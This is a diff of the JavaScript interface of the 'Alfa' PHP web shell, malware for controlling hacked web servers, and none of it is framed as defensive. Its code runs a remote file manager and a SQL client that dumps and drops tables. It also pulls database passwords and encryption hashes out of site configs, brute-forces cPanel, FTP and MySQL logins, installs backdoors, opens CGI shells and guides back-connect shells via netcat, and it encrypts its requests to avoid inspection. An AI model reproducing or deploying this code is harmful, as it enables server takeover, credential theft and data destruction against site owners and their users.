alfa1="query",alfa2=f.query?alfab64(f.query.value):"",host=f.sql_host?f.sql_host.value:mysql_cache.host,user=f.sql_login?f.sql_login.value:mysql_cache.user,pass=f.sql_pass?f.sql_pass.value:mysql_cache.pass,db=f.sql_base?f.sql_base.value:mysql_cache.db,type=f.type?f.type.value:mysql_cache.type,charset=f.charset?f.charset.value:mysql_cache.charset,count="";switch(count=f.sql_count?f.sql_count.checked?"true":"":mysql_cache.count,f){case"0":alfa1="select",alfa2=alfab64(e);break;case"1":e=eval(e),alfa1="select",alfa2=alfab64(e[0])+"&alfa3="+alfab64(e[1]);break;case"2":e=eval(e),alfa1="edit",alfa2=alfab64(db)+"&alfa3="+alfab64(e.join(":"));break;case"3":alfa1="loadfile",alfa2=alfab64(e);break;case"4":case"5":alfa1=(f=="4"?"dumpfile":"droptbl");var obj={},id=$("dumpfile");for(obj.file=id?id.value:"dump.sql",obj.tbl=[],i=0;i<d.sf.elements["tbl[]"].length;++i)d.sf.elements["tbl[]"][i].checked&&obj.tbl.push(d.sf.elements["tbl[]"][i].value);alfa2=alfab64(JSON.stringify(obj))}_Ajax(d.URL,"a="+alfab64("Sql")+"&alfa1="+alfab64(alfa1)+"&alfa2="+alfa2+"&c="+alfab64(c_)+"&charset="+alfab64(charset)+"&type="+alfab64(type)+"&sql_host="+alfab64(host)+"&sql_login="+alfab64(user)+"&sql_pass="+alfab64(pass)+"&sql_base="+alfab64(db)+"&sql_count="+alfab64(count)+"&ajax="+alfab64("true"),function(a){evalJS(a),alfaloader("none")},!0)}function ctlbc(a){var b=$("bcStatus"),c=$("bcipAction");"bind"==a.value?(c.style.display="none",b.innerHTML="<small>Press ` <font color=\'red\'>>></font> ` button and run ` <font color=\'red\'>nc server_ip port</font> ` on your computer</small>"):(c.style.display="inline-block",b.innerHTML="<small>Run ` <font color=\'red\'>nc -l -v -p port</font> ` on your computer and press ` <font color=\'red\'>>></font> ` button</small>")}function is(){for(i=0;i<d.sf.elements["tbl[]"].length;++i)d.sf.elements["tbl[]"][i].checked=!d.sf.elements["tbl[]"][i].checked}function $(a){return d.getElementById(a)}function addnewup(){var a="footerup_"+upcount,b="pfooterup_"+upcount,c=1!=upcount?"pfooterup_"+(upcount-1):"pfooterup",e=d.createElement("p");e.innerHTML=\'<label class="inputfile" for="\'+a+\'"><span id="__fnameup\'+upcount+\'"></span> <strong>&nbsp;&nbsp;Choose a file</strong></label><input id="\'+a+\'" type="file" name="f[]" onChange="handleup(this,\'+upcount+\');">\',e.id=b,e.appendAfter($(c)),upcount++}function alfa_searcher_tool(a){switch(a){case"all":case"dirs":_alfaSet(!0,"Disabled");break;case"files":_alfaSet(!1,"php")}}function _alfaSet(a,b){d.srch.ext.disabled=a,d.srch.ext.value=b}function dis_input(a){switch(a){case"phpmyadmin":bruteSet(!0,"Disabled","http://");break;case"direct":bruteSet(!1,"2222","http://");break;case"cp":bruteSet(!1,"2082","http://");break;case"ftp":bruteSet(!0,"Disabled","ftp://");break;case"mysql":bruteSet(!1,"3306","http://");break;case"ftpc":bruteSet(!1,"21","http://")}}function bruteSet(a,b,d){"21"!=b?c="localhost":c="ftp.example.com",$("port").disabled=a,$("port").value=b,$("target").value=c,$("protocol").value=d}Element.prototype.appendAfter=function(a){a.parentNode.insertBefore(this,a.nextSibling)};function inBackdoor(t){if(t.value=="my"){$("backdoor_textarea").style.display="block";}else{$("backdoor_textarea").style.display="none";}}
-function saveByKey(event){
-	if(!(String.fromCharCode(event.which).toLowerCase() == \'s\' && event.ctrlKey) && !(event.which == 19))return true;
-	$("editor_edit_area").onsubmit();
-	event.preventDefault();
-	return false;
-}
-function setCookie(cname, cvalue, exdays){
-    var d = new Date();
-    d.setTime(d.getTime() + (exdays*24*60*60*1000));
-    var expires = "expires="+ d.toUTCString();
-    document.cookie = cname + "=" + cvalue + ";" + expires + ";path=/";
-}
-function getCookie(name){
-  var value = "; " + document.cookie;
-  var parts = value.split("; " + name + "=");
-  if (parts.length == 2) return parts.pop().split(";").shift();
-}
-function editorClose(pos){
-	d.body.style.overflow = "visible";
-	elem = $(pos);
-	elem.setAttribute("class", "editor-anim-close");
-	if(pos == "editor"){
-		is_minimized = false;
-	}else{
-		cgi_is_minimized = false;
-	}
-	setTimeout(function(){
-		elem.removeAttribute("class");
-		elem.style.display = "none";
-	}, 1000);
-	d.body.style.overflow = "visible";
-}
-function showEditor(pos){
-	$(pos).setAttribute("class", "editor-anim-show");
-	$(pos+"-minimized").setAttribute("class", "minimized-hide");
-	if(pos == "editor"){
-		is_minimized = false;
-		if(cgi_is_minimized){
-			$("cgiloader-minimized").style.top = "30%";
-		}
-	}else{
-		cgi_is_minimized = false;
-		if(is_minimized){
-			$("editor-minimized").style.top = "30%";
-		}
-	}
-	d.body.style.overflow = "hidden";
-}
-function editorMinimize(pos){
-	$(pos).setAttribute("class", "editor-anim-minimize");
-	$(pos+"-minimized").setAttribute("class", "minimized-show");
-	if(pos == "editor"){
-		is_minimized = true;
-		if(cgi_is_minimized){
-			$("cgiloader-minimized").style.top = "20%";
-			$("editor-minimized").style.top = "50%";
-		}else{
-			$("editor-minimized").style.top = "30%";
-		}
-	}else{
-		cgi_is_minimized = true;
-		if(is_minimized){
-			$("cgiloader-minimized").style.top = "20%";
-			$("editor-minimized").style.top = "50%";
-		}else{
-			$("cgiloader-minimized").style.top = "30%";
-		}
-	}
-	d.body.style.overflow = "visible";
-}
-function clearEditorHistory(){
-	var check = confirm("Are u Sure?");
-	if(check){
-		for(var i in editor_files){
-			if(i != editor_current_file){
-				removeHistory(i);
-			}
-		}
-	}
-}
-function editor(file, mode, arg, pwd, file_id, type){
-	if(type=="dir"&&file=="..")return false;
-	if(mode == "download"){
-		g("FilesTools",pwd,file,"download");
-		return false;
-	}
-	var param = "", fid = "", pure_fid = "", cwd = d.mf.c.value, can_append = true;
-	file = file.trim();
-	if(Object.keys(editor_files).length == 0){
-		var cookie_file = getCookie("alfa_history_files");
-		try{
-			editor_files = JSON.parse(cookie_file);
-			for(var t in editor_files){
-				insertToHistory(t, editor_files[t].file, 0, editor_files[t].type);
-			}
-		}catch(e){}
-	}
-	if(file.indexOf("/") != -1){
-		var file_split = file.split("/");
-		file = file_split[file_split.length - 1];
-		delete file_split[file_split.length - 1];
-		cwd = file_split.join("/");
-		if(islinux){
-			cwd = "/"+cwd;
-		}
-	}
-	if(typeof type == "undefined"){
-		type = "";
-	}
-	if(typeof pwd != "undefined" && pwd != null && pwd.length != 0){
-		cwd = pwd.trim();
-	}
-	try{
-		for(var i in editor_files){
-			if(editor_files[i].file == decodeURIComponent(file) && editor_files[i].pwd.replace(/\//g,"") == cwd.replace(/\//g,"")){
-				can_append = false;
-				file_id = i;
-				break;
-			}
-		}
-	}catch(e){
-		console.log(e);
-	}
-	editor_error = true;
-	if(typeof arg != "undefined" && arg.length != 0 && arg != null){
-		param = alfab64(arg);
-	}
-	if(typeof file_id != "undefined" && file_id != null && file_id.length != 0){
-		fid = alfab64(file_id);
-		pure_fid = file_id;
-	}else{
-		var rand_fid = "file_" + getRandom(10);
-		fid = alfab64(rand_fid);
-		pure_fid = rand_fid;
-	}
-	alfaloader("block");
-	_Ajax(d.URL, "a="+alfab64("FilesTools")+"&c="+alfab64(cwd)+"&alfa1="+alfab64(file)+"&alfa2="+alfab64(mode)+"&alfa3="+param+"&alfa4="+fid+"&alfa5=&alfa6=&alfa7=&alfa8=&alfa9=&alfa10=&&ajax="+alfab64("true"), function(e){
-		document.querySelector(".editor-content").innerHTML = e;
-		$("editor").style.display  = "block";
-		alfaloader("none");
-		evalJS(e);
-		if(mode != "delete" && editor_error){
-			var active = d.getElementsByClassName("is_active");
-			if(active.length != 0){
-				active[0].className = "file-holder";
-			}
-			fid = pure_fid;
-			file = decodeURIComponent(file);
-
-			if(!editor_files[fid] && can_append){
-				editor_files[fid] = {"file": file, "pwd": cwd, "type": type};
-				insertToHistory(fid, file, " is_active", type);
-				if(mode=="mkfile"){
-					g("FilesMan",null);
-				}
-			}else{
-				$(fid).parentNode.className += " is_active";
-			}
-		}
-		d.body.style.overflow = "hidden";
-		d.getElementsByClassName("filestools")[0].setAttribute("fid", fid);
-		if(editor_files[fid]){
-			d.getElementsByClassName("editor-path")[0].innerHTML = (editor_files[fid].pwd + "/" + editor_files[fid].file).replace(/\/\//g, "/");
-		}
-		editor_current_file = fid;
-		if(is_minimized){
-			showEditor("editor");
-		}
-		updateCookieEditor();
-	});
-	return false;
-}
-function insertToHistory(fid, file, mode, type){
-	var active = "";
-	if(mode && mode != 0){
-		active = mode;
-	}
-	var NewElement = document.createElement("div");
-	NewElement.innerHTML = "<div id=\'"+fid+"\' class=\'history\' onClick=\'reopen(this);\'><div class=\'editor-icon\'>"+loadType(file,type,fid)+"</div><div class=\'editor-file-name\'>"+file+"</div></div><div class=\'history-close\' onClick=\'removeHistory(\""+fid+"\");\'>X</div>";
-	NewElement.className = "file-holder" + active;
-	NewElement.addEventListener("mouseover", function(){setEditorTitle(fid,"over");this.childNodes[1].style.opacity = "1";});
-	NewElement.addEventListener("mouseout", function(){setEditorTitle(fid,"out");this.childNodes[1].style.opacity = "0";});
-	var refNode = d.getElementsByClassName("history-list")[0];
-	refNode.insertBefore(NewElement, refNode.firstChild);
-}
-function loadType(file,type,id){
-	if(type == "none"){
-		_Ajax(d.URL, "a="+alfab64("checkfiletype")+"&path="+alfab64(editor_files[id].pwd)+"&arg="+alfab64(editor_files[id].file), function(e){
-			$(id).innerHTML = "<div class=\'editor-icon\'>"+loadType(editor_files[id].file,e,id)+"</div><div class=\'editor-file-name\'>"+editor_files[id].file+"</div>";
-			editor_files[id].type = e;
-		});
-	}
-	var img = \'<img src="http://solevisible.com/icons/{type}" width="30" height="30">\';
-	if(type == "file"){
-		type = file.split(".");
-		type  = type[type.length - 1].toLowerCase();
-		var types = ["json","ppt","pptx","xls","xlsx","msi","config","cgi","pm","c","cpp","cs","java","aspx","asp","db","ttf","eot","woff","woff2","woff","conf","log","apk","cab","bz2","tgz","dmg","izo","jar","7z","iso","rar","bat","sh","alfa","gz","tar","php","php4","php5","phtml","html","xhtml","shtml","htm","zip","png","jpg","jpeg","gif","bmp","ico","txt","js","rb","py","xml","css","sql","htaccess","pl","ini","dll","exe","mp3","mp4","m4a","mov","flv","swf","mkv","avi","wmv","mpg","mpeg","dat","pdf","3gp","doc","docx","docm"];
-		if(types.indexOf(type) == -1){
-			type = "notfound";
-		}
-	}else{
-		type = "folder";
-	}
-	return img.replace("{type}",  type + ".png");
-}
-function updateDirsEditor(fid, fname){
-	var current_path = d.mf.c.value + "/";
-	var oldpath  = editor_files[fid].pwd + "/" + fname + "/";
-	var newpath  = editor_files[fid].pwd + "/" + editor_files[fid].file + "/";
-	oldpath = oldpath.replace(/\/\//g, "/");
-	newpath = newpath.replace(/\/\//g, "/");
-	current_path = current_path.replace(/\/\//g, "/");
-	if(current_path.search(oldpath) != -1){
-		initDir(current_path.replace(oldpath, newpath));
-		d.mf.c.value = current_path.replace(oldpath, newpath);
-		_Ajax(d.URL,"a="+alfab64("updatepath")+"&path="+alfab64(d.mf.c.value),function(e){console.log(e)});
-	}
-	for(var i in editor_files){
-		var path = editor_files[i].pwd + "/";
-		path = path.replace(/\/\//g, "/");
-		if(path.search(oldpath) != -1){
-			editor_files[i].pwd = path.replace(oldpath, newpath);
-		}
-	}
-	var reg1 = new RegExp("\'"+oldpath.slice(0, -1)+"\'");
-	var reg2 = new RegExp(fname + " \\\|</b></a>");
-	d.files.innerHTML = d.files.innerHTML.replace(reg1, "\'"+newpath.slice(0, -1)+"\'");
-	d.files.innerHTML = d.files.innerHTML.replace(reg2, editor_files[fid].file+" |</b></a>");
-	updateCookieEditor();
-}
-function updateCookieEditor(){
-	setCookie("alfa_history_files", JSON.stringify(editor_files), 2012);
-}
-function setEditorTitle(fid, mode){
-	if(mode == "out" && editor_current_file != ""){
-		fid = editor_current_file;
-	}
-	if(editor_files[fid]){
-		d.getElementsByClassName("editor-path")[0].innerHTML = (editor_files[fid].pwd + "/" + editor_files[fid].file).replace(/\/\//g, "/");
-	}
-}
-function removeHistory(el){
-	delete editor_files[el];
-	if($(el)){
-		$(el).parentNode.parentNode.removeChild($(el).parentNode);
-	}
-	var elm = d.getElementsByClassName("filestools")[0];
-	if(elm){
-		if(elm.getAttribute("fid") == el){
-			elm.outerHTML = "";
-		}
-	}
-	if(editor_current_file == el){
-		editor_current_file = "";
-	}
-	updateCookieEditor();
-}
-function getRandom(e){
-	for(var i = "undefined" == typeof e ? 20 : e, t = "", s = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ", n = i; n > 0; --n) t += s[Math.floor(Math.random() * s.length)];
-	return t
-}
-function reopen(el){
-	var file_id = el.getAttribute("id")
-	var pwd = editor_files[file_id].pwd;
-	var filename = editor_files[file_id].file;
-	editor(filename, "auto", "", pwd, file_id);
-}
-function copyToClipboard(el){
-	var node = document.getElementById(el);
-	if(document.selection){
-		var range = document.body.createTextRange();
-		range.moveToElementText(document.getElementById(el));
-		range.select();
-		document.execCommand("Copy");
-		alert("text copied");
-	}else if (window.getSelection()){
-		var range = document.createRange();
-		range.selectNode(document.getElementById(el));
-		window.getSelection().removeAllRanges();
-		window.getSelection().addRange(range);
-		document.execCommand("copy");
-		alert("text copied");
-	}
-}
-function encrypt(str, pwd) {
-	if (pwd == null || pwd.length <= 0) {
-		return null;
-	}
-	str = alfab64(str, true);
-	pwd = alfab64(pwd, true);
-	var enc_chr = "";
-	var enc_str = "";
-	var i = 0;
-	while (i < str.length) {
-		for (var j = 0; j < pwd.length; j++) {
-			enc_chr = str.charCodeAt(i) ^ pwd.charCodeAt(j);
-			enc_str += String.fromCharCode(enc_chr);
-			i++;
-			if (i >= str.length) break;
-		}
-	}
-	return alfab64(enc_str, true);
-}
-function reloadSetting(e){
-alfaloader("block");
-_Ajax(d.URL,"a="+alfab64("settings")+"&alfa1="+alfab64(e.protect.value)+"&alfa2="+alfab64(e.lgpage.value)+"&alfa3="+alfab64(e.username.value)+"&alfa4="+alfab64(e.password.value)+"&alfa5="+alfab64(">>")+"&alfa6="+alfab64(e.icon.value)+"&alfa7="+alfab64(e.post_encrypt.value)+"&alfa8="+alfab64("main")+"&c="+alfab64(c_)+"&ajax="+alfab64("true"),function(a){evalJS(a),alfaloader("none")},true);
-if(e.e.value==0&&e.protect.value==1)setTimeout("location.reload()",1000);
-if(e.s.value!=e.icon.value)setTimeout("location.reload()",1000);
-return false
-}
-function reloadColors(config){
-	var obj = {};
-	if(typeof config == "undefined"){
-		d.querySelectorAll(".colors_input").forEach(function(e){
-			var id = e.getAttribute("target").replace(".", "");
-			obj[id] = e.value;
-		});
-	}else{
-		obj = config;
-	}
-	alfaloader("block");
-	var checdk = ($("use_default_color").checked?"1":"0");
-	_Ajax(d.URL,"a="+alfab64("settings")+"&alfa1="+alfab64(JSON.stringify(obj))+"&alfa2="+alfab64(">>")+"&alfa3="+alfab64(checdk)+"&alfa8="+alfab64("color")+"&c="+alfab64(c_)+"&ajax="+alfab64("true"),function(e){alfaloader("none");evalJS(e);},true);
-}
-function alfab64(a, normal){
-	if(typeof normal != "undefined" || post_encryption_mode == false){
-		return window.btoa(unescape(encodeURIComponent(a)));
-	}
-	return encrypt(a, "'._AlfaSecretKey().'");
-}
-function evalCss(jcss){
-	var style = document.createElement("style");
-	if (style.styleSheet) {
-		style.styleSheet.cssText = jcss;
-	} else {
-		style.appendChild(document.createTextNode(jcss));
-	}
-	d.getElementsByTagName("head")[0].appendChild(style);
-}
-function colorHandlerKey(el){
-	setTimeout(function(e){
-		colorHandler(el);
-	}, 200);
-}
-function colorHandler(el){
-	var target = el.getAttribute("target");
-	var multi = el.getAttribute("multi");
-	var ishover = target.indexOf(":hover");
-	if(multi){
-		var array = JSON.parse(atob(multi));
-		var jcss = "";
-		for(i in array.multi_selector){
-			jcss += i + "{"+array.multi_selector[i].replace(/{color}/g, el.value)+"}";
-		}
-		evalCss(jcss);
-	}
-	if(ishover != -1 && !multi){
-		$("input_" + target.replace(".","")).value = el.value;
-		$("gui_" + target.replace(".","")).value = el.value;
-		var css = target+"{color: "+el.value+";}";
-		evalCss(css);
-	}else{
-		$("input_" + target.replace(".","")).value = el.value;
-		$("gui_" + target.replace(".","")).value = el.value;
-		if(target == ".header_values"){
-			target = ".header,.header_values";
-		}
-		d.querySelectorAll(target).forEach(function(e){
-			e.style.color = el.value;
-		});
-	}
-}
-function importConfig(event){
-	var input = event.target;
-    var reader = new FileReader();
-    reader.onload = function(){
-      var data = reader.result;
-	  try{
-		  var conf = JSON.parse(data);
-		  reloadColors(conf);
-	  }catch(e){
-		  alert("Config is invalid...!");
-	  }
-	  $("importFileBtn").value = "";
-    };
-    reader.readAsText(input.files[0]);
-}
-function checkBox(){for(i=0;i<d.files.elements.length;i++){if(d.files.elements[i].type == "checkbox"){d.files.elements[i].checked = d.files.elements[0].checked;}}}
-function path_history(pos){
-	_Ajax(d.URL,"a="+alfab64("GetPathHistory")+"&ajax="+alfab64("true"),function(e){g("FilesMan", e);},true);
-}
-function runcgi(lang){
-	if(cgi_is_minimized && cgi_lang == lang){
-		showEditor("cgiloader");
-		return false;
-	}
-	_Ajax(d.URL,"a="+alfab64("cgishell")+"&alfa1="+alfab64(lang)+"&ajax="+alfab64("true"),function(e){
-		d.body.style.overflow = "hidden";
-		$("cgiloader").style.display = "block";
-		$("cgiframe").innerHTML = e;
-		cgi_lang = lang;
-		if(cgi_is_minimized){
-			$("cgiloader-minimized").setAttribute("class", "minimized-hide");
-			setTimeout(function(){
-				$("cgiloader").removeAttribute("class");
-				if(is_minimized){
-					$("editor-minimized").style.top = "30%";
-				}
-			}, 1000);
-		}
-	});
-}
-';
-echo "</script>
-<form style='display:none;' id='dlForm' action='' target='_blank' method='post'>
+var post_encryption_mode = ".(__ALFA_POST_ENCRYPTION__?'true':'false').";";?>
+var alfa1_="",alfa2_="",alfa3_="",alfa4_="",alfa5_="",alfa6_="",alfa7_="",alfa8_="",alfa9_="",alfa10_="",d=document,mysql_cache={},editor_files={},editor_error=!0,editor_current_file="",php_temrinal_using_cgi=!1,is_minimized=!1,cgi_is_minimized=!1,options_window_is_minimized=!1,database_window_is_minimized=!1,rightclick_menu_context=null,can_hashchange_work=!0,alfa_can_add_opt=!1,alfa_before_do_action_id="",alfa_ace_editors={editor:null,eval:null},col_dumper_selected_data={},_ALFA_AJAX_={},cgi_lang="",upcount=1,terminal_walk_index=[],alfa_current_fm_id=1,alfa_fm_id=0;function set(e,a,t,i,l,o,r,n,s,c,f,_,u){d.mf.a.value=null!=e?e:a_,d.mf.c.value=null!=a?a:c_,d.mf.alfa1.value=null!=t?t:"",d.mf.alfa2.value=null!=i?i:"",d.mf.alfa3.value=null!=l?l:"",d.mf.alfa4.value=null!=o?o:"",d.mf.alfa5.value=null!=r?r:"",d.mf.alfa6.value=null!=n?n:"",d.mf.alfa7.value=null!=s?s:"",d.mf.alfa8.value=null!=c?c:"",d.mf.alfa9.value=null!=f?f:"",d.mf.alfa10.value=null!=_?_:"",d.mf.charset.value=null!=u?u:charset_}function fc(e){var a=alfa_current_fm_id,t="a="+alfab64("FilesMan")+"&c="+alfab64(e.c.value)+"&alfa1="+alfab64(e.alfa1.value)+"&ajax="+alfab64("true")+"&",i="",l=0;if(d.querySelectorAll("#filesman_holder_"+a+" form[name=files] input[type=checkbox]").forEach(function(e){e.checked&&(l++,i+="f[]="+alfab64(decodeURIComponent(e.value))+"&")}),0==l&&"paste"!=e.alfa1.value)return!1;switch(alfaloader("filesman_holder_"+a,"block"),e.alfa1.value){case"delete":d.querySelectorAll("#filesman_holder_"+a+" .fmanager-row").forEach(function(e){var a=e.querySelector("input[type=checkbox]");a.checked&&".."!=a.value?e.remove():a.checked=!1}),d.querySelector("#filesman_holder_"+a+" .chkbx").checked=!1;break;case"copy":case"move":case"zip":case"unzip":d.querySelectorAll("#filesman_holder_"+a+" input[type=checkbox]:checked").forEach(function(e){e.checked=!1})}_Ajax(d.URL,t+i,function(e){alfaloader("filesman_holder_"+a,"none"),alfaFmngrContextRow()},!1,"filesman_holder_"+a)}function initDir(e){var a="",t="";islinux&&(a="<a class=\"header_pwd\" onclick=\"g('FilesMan','/');\" path='/' href='#action=fileman&path=/'>/</a>",t="/");var l=e.split("/"),o="",r=islinux?"/":"";for(i in"-1"!=l.indexOf("..")&&(l.splice(l.indexOf("..")-1,1),l.splice(l.indexOf(".."),1)),l)""!=l[i]&&(o+="<a onclick=\"g('FilesMan','"+r+l[i]+"/');\" path='"+r+l[i]+"/' href='#action=fileman&path="+r+l[i]+'/\' class="header_pwd">'+l[i]+"/</a>",r+=l[i]+"/");$("header_cwd").innerHTML=a+o+" ",alfaInitCwdContext(),l=(l=t+l.join("/")).replace("//","/"),d.footer_form.c.value=l,$("footer_cwd").value=l,c_=l}function evalJS(html){var newElement=document.createElement("div");newElement.innerHTML=html;for(var scripts=newElement.getElementsByTagName("script"),i=0;i<scripts.length;++i){var script=scripts[i];eval(script.innerHTML)}}function _Ajax(e,a,t,i,l){var o=!1;return window.XMLHttpRequest?o=new XMLHttpRequest:window.ActiveXObject&&(o=new ActiveXObject("Microsoft.XMLHTTP")),void 0!==l&&(_ALFA_AJAX_[l]=o),o?(o.onreadystatechange=function(){4==o.readyState&&200==o.status?"function"==typeof t&&(t(o.responseText,l),alfaClearAjax(l)):4==o.readyState&&200!=o.status&&(alfaAjaxError(o.status,l,o.statusText,o.responseText),alfaClearAjax(l))},o.open("POST",e,!0),o.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),void o.send(a)):void alert("Error !")}function alfaClearAjax(e){_ALFA_AJAX_.hasOwnProperty(e)&&delete _ALFA_AJAX_[e]}function handleup(e,a){var t="__fnameup";if(0!=a&&(t="__fnameup"+a),e.files.length>1){for(var i="",l=0;l<e.files.length;l++)i+=e.files[0].name+", ";$(t).innerHTML=i}else e.files[0].name&&($(t).innerHTML=e.files[0].name)}function u(e){var a=!1,t=0,i=alfa_current_fm_id,l=new FormData,o="filesman_holder_"+i;l.append("a",alfab64(e.a.value)),l.append("c",alfab64(e.c.value)),l.append("alfa1",alfab64(e.alfa1.value)),l.append("charset",alfab64(e.charset.value)),l.append("ajax",alfab64(e.ajax.value)),e.querySelectorAll("input[type=file]").forEach(function(e){if(0==e.value.length)return!1;if(e.files.length>1)for(var a=0;a<e.files.length;a++)l.append("f[]",e.files[a]);else l.append("f[]",e.files[0]);t++}),$("footerup").value="",$("__fnameup").innerHTML="";for(var r=1;r<=upcount;r++){var n=$("pfooterup_"+r);n&&n.parentNode.removeChild(n),upcount--}if(0==upcount&&upcount++,0==t)return!1;var s="up_bar_"+getRandom();$("up_bar_holder").insertAdjacentHTML("beforeend","<div id='"+s+"' class='up_bar'></div>");e.c.value;if(window.XMLHttpRequest?a=new XMLHttpRequest:window.ActiveXObject&&(a=new ActiveXObject("Microsoft.XMLHTTP")),a){var c=$(s);_ALFA_AJAX_[s]=a,a.upload&&(c.style.display="block",a.upload.onprogress=function(e){var a=e.position||e.loaded,t=e.totalSize||e.total,i=Math.floor(a/t*1e3)/10+"%";c.style.width=i}),a.onload=function(e){200===a.status?c.style.display="none":alfaAjaxError(a.status,"upload_area",a.statusText,a.responseText),alfaClearAjax(s)},a.onreadystatechange=function(){if(4==a.readyState&&200==a.status){if("noperm"!=a.responseText&&"[]"!=a.responseText){var e,t=JSON.parse(a.responseText),l="",r=d.querySelectorAll("#"+o+" #filemanager_table tr").length-3;for(e in t){++r;var n=t[e].name,s=encodeURIComponent(n),c=t[e].size,f=t[e].perm,_=t[e].modify,u=t[e].owner,p=loadType(n,"file");try{d.querySelector("#"+o+" .fmanager-row a[fname='"+n+"']").parentElement.parentElement.parentElement.remove()}catch(e){}l+='<tr class="fmanager-row" id="tr_row_'+r+'"><td><div class="myCheckbox"><input type="checkbox" name="f[]" value="'+n+'" class="chkbx" id="checkbox'+r+'"><label for="checkbox'+r+'"></label></div></td><td id="td_row_'+r+'">'+p+'<div style="position:relative;display:inline-block;bottom:12px;"><a row="'+r+'" id="id_'+r+'" class="main_name" onclick="editor(\''+s+"','auto','','','','file');\" href=\"#action=fileman&amp;path="+c_+"&amp;file="+s+'" fname="'+n+'" ftype="file" path="'+c_+'" opt_title="">'+n+'</a></div></td><td><span style="font-weight:unset;" class="main_size">'+c+'</span></td><td><span style="font-weight:unset;" class="main_modify">'+_+'</span></td><td><span style="font-weight:unset;" class="main_owner_group">'+u+'</span></td><td><a id="id_chmode_'+r+'" href="javascript:void(0)" onclick="editor(\''+s+"','chmod','','','','file')\">"+f+'</a></td><td><a id="id_rename_'+r+'" title="Rename" class="actions" href="javascript:void(0);" onclick="editor(\''+s+"', 'rename','','','','file')\">R</a> <a id=\"id_touch_"+r+'" title="Modify Datetime" class="actions" href="javascript:void(0);" onclick="editor(\''+s+"', 'touch','','','','file')\">T</a> <a id=\"id_edit_"+r+'" class="actions" title="Edit" href="javascript:void(0);" onclick="editor(\''+s+"', 'edit','','','','file')\">E</a> <a id=\"id_download_"+r+'" title="Download" class="actions" href="javascript:void(0);" onclick="g(\'FilesTools\',null,\''+n+"', 'download')\">D</a><a id=\"id_delete_"+r+'" title="Delete" class="actions" href="javascript:void(0);" onclick="var chk = confirm(\'Are You Sure For Delete # '+s+" # ?'); chk ? g('FilesMan',null,'delete', '"+s+"') : '';\"> X </a></td></tr>"}d.querySelector("#"+o+" #filemanager_last_tr").insertAdjacentHTML("beforebegin",l),alfaShowNotification("File(s) uploaded successfully","Uploader"),alfaFmngrContextRow()}else alfaShowNotification("Folder has no permission...","Uploader","error");alfaCheckCurrentFilesManTab(i)}},a.open("POST",d.URL),a.send(l)}}function alfaCheckCurrentFilesManTab(e){-1==$("filesman_tab_"+e).classList.value.indexOf("filesman-tab-active")&&$("filesman_tab_"+e).classList.add("tab-is-done")}function g(a,c,alfa1,alfa2,alfa3,alfa4,alfa5,alfa6,alfa7,alfa8,alfa9,alfa10,charset){var fm_id=0==alfa_fm_id?alfa_current_fm_id:alfa_fm_id,fm_id2=alfa_fm_id,fm_path=null==c||0==c.length?c_:c,d_mf_c=fm_path,g_action_id=alfa_before_do_action_id;0==alfa_fm_id&&(set(a,c,alfa1,alfa2,alfa3,alfa4,alfa5,alfa6,alfa7,alfa8,alfa9,alfa10,charset),d_mf_c=d.mf.c.value),"GetConfig"!=a&&"download"!=alfa2&&islinux&&"/"!=d_mf_c.substr(0,1)&&(d_mf_c="/"+d_mf_c),"FilesMan"==a?(alfaloader("filesman_holder_"+fm_id,"block"),g_action_id="filesman_holder_"+fm_id):""!=g_action_id?alfaloader(g_action_id,"block"):"FilesTools"!=a&&"download"!=alfa2&&"GetConfig"!=a&&("sql"==a?(showEditor("database_window"),g_action_id=loadPopUpDatabase("")):"FilesMan"!=a&&(showEditor("options_window"),g_action_id=loadPopUpOpTions(a)),alfaloader(g_action_id,"block"));for(var data="a="+alfab64(a)+"&c="+alfab64(d_mf_c)+"&",i=1;i<=10;i++)data+="alfa"+i+"="+alfab64(eval("d.mf.alfa"+i+".value"))+"&";if("FilesMan"==a){var pagenum=d.querySelector("#"+g_action_id+" .page-number.active-page-number");null!=pagenum&&(data+="pagenum="+alfab64(getCookie(g_action_id+"_page_number")),setCookie(g_action_id+"_page_number",1,2012))}if(data+="&ajax="+alfab64("true"),"FilesTools"==a&&"download"==alfa2){alfaLoaderOnTop("none");var dl=$("dlForm");return dl.a.value=alfab64("dlfile"),dl.c.value=alfab64(d_mf_c),dl.file.value=alfab64(alfa1),void dl.submit()}"GetConfig"!=a?(_Ajax(d.URL,data,function(e,t){evalJS(e);var i=!1;if(alfaLoaderOnTop("none"),"sql"==a)return console.log(t),loadPopUpDatabase(e,t),!1;if("FilesMan"==a){alfaloader("filesman_holder_"+fm_id,"none"),d.querySelector("#filesman_holder_"+fm_id).innerHTML=e,fm_path=fm_path.replace(/\/\//g,"/"),$("filesman_tab_"+fm_id).setAttribute("path",fm_path);var l=alfaGetLastFolderName(fm_path);d.querySelector("#filesman_tab_"+fm_id+" span").innerHTML=l,alfaFmngrContextRow(),"function"==typeof alfa1&&alfa1(e),alfaCheckCurrentFilesManTab(fm_id)}else(options_window_is_minimized||"."==t.substr(0,1))&&"."==t.substr(0,1)&&(i=!0,t=t.substr(1),showEditor("options_window")),i||alfaloader(t,"none"),loadPopUpOpTions(t,e),"phpeval"==a&&alfaLoadAceEditor("PhpCode"),"coldumper"==a.substr(0,9)&&alfaColDumperInit()},!1,""==g_action_id?"."+a:g_action_id),g_action_id="",0==fm_id2&&c!=c_&&c&&initDir(c)):(alfaloader(alfa3,"block"),_Ajax(d.URL,data,function(e,a){var t=a;a=d.querySelector("#"+("id_db"!=a.substr(0,5)?"option_"+a:a));try{(e=JSON.parse(e)).host&&e.user&&e.dbname&&($("db_host")&&(a.querySelector("#db_host").value=e.host),$("db_user")&&(a.querySelector("#db_user").value=e.user),$("db_name")&&(a.querySelector("#db_name").value=e.dbname),$("db_pw")&&(a.querySelector("#db_pw").value=e.password),$("db_prefix")&&e.prefix&&(a.querySelector("#db_prefix").value=e.prefix),$("cc_encryption_hash")&&e.cc_encryption_hash&&(a.querySelector("#cc_encryption_hash").value=e.cc_encryption_hash))}catch(e){}alfaloader(t,"none")},!1,alfa3))}function alfaGetLastFolderName(e){var a=e.replace(/\/\//g,"/").split("/");for(var t in a)0==a[t].length&&a.splice(t,1);var i=a[a.length-1];return 0==i.length&&(i="/"),i}function alfaloader(e,a){if(0==e.length)return!1;try{var t=$("loader_"+e);if(null==t&&"block"==a){var i=null;"editor"==e?i=d.querySelector("#editor 